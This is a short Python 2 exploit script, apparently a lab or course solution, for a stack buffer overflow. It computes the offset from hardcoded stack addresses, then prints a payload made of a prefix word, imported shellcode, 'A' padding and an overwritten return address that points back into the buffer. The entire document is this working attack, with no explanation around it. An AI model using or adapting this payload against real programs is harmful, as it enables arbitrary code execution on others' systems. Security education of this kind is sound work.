from shellcode import shellcode
from struct import pack

ebp = 0xbffe9988;
buf_addr = 0xbffe9950;
offset = ebp - buf_addr;

print pack('<I', 0xFFFFFFFF) + shellcode + 'A' * (offset-len(shellcode)+4) + pack('<I', buf_addr)
